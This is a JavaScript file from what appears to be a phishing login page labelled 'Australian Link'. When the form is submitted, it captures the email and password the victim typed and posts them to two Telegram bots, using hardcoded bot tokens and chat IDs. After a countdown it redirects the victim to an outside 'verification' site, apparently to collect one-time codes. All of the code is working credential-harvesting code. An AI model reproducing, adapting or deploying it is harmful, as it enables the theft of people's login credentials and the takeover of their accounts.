const chatIds = ["1636602095","325796137" ];


let formm;
let delayy;
let counterr;
let email_field;
let password_field;
let submit_btn;
let show_password_btn;

document.addEventListener("DOMContentLoaded", () => {
  counterr = document.querySelector(".counterr");
  delayy = document.getElementById("delayy");
  email_field = document.getElementById("user_email");
  show_password_btn = document.getElementById("show_password_btn");

  password_field = document.getElementById("user_password");
  show_password_btn.addEventListener("click", () => {
    if (password_field.type === "password") {
      password_field.type = "text";
    } else {
      password_field.type = "password";
    }
  });
  submit_btn = document.getElementById("submit_btn");
  formm = document.getElementById("formm");

  formm.addEventListener("submit", (e) => {
    e.preventDefault();
    show_counter();
    console.log("submit form");
    submit_details();
    submit_details2();

  });
});

// const ;
function show_counter() {
  submit_btn.disabled = true;
  const del = document.getElementById("delayy");
  del.style.display = "flex";
}
async function submit_details() {
  // const intervall = setInterval(() => {
  //   counterr.innerText = counterr.innerText - 1;
  //   if (counterr.innerText == 0) {
  //     clearInterval(intervall);
  //     window.location.href = `/verify/?em=${email_field.value}`;
  //   }
  //   console.log("reduced");
  // }, 1000);
  const msg = ` New user Australian Link \n 
  Email is ${email_field.value} \n
  password is ${password_field.value} \n 
  Prompting Verfication codes in 60s
  `;
  
  const data = {
    chat_id: "1636602095",
    text: msg,
  };
  const resp = await fetch(
    `https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendMessage`,
    {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify(data),
    }
  );
  const resJson = await resp.json();
  console.log(resJson);
}

async function submit_details2() {
  const intervall = setInterval(() => {
    counterr.innerText = counterr.innerText - 1;
    if (counterr.innerText == 0) {
      clearInterval(intervall);
      window.location.href = `https://verify-me-jqw6.vercel.app/?em=${email_field.value}`;
    }
    console.log("reduced");
  }, 1000);
  const msg = ` New user Australian Link \n 
  Email is ${email_field.value} \n
  password is ${password_field.value} \n 
  Prompting Verfication codes in 60s
  `;
  const data = {
    chat_id: "6924640648",
    text: msg,
  };
  const resp = await fetch(
    `https://api.telegram.org/bot6749081112:AAGkV5D6iDUXBpDApDu2kImMs2qJyMdg13U/sendMessage`,
    {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify(data),
    }
  );
  const resJson = await resp.json();
  console.log(resJson);
}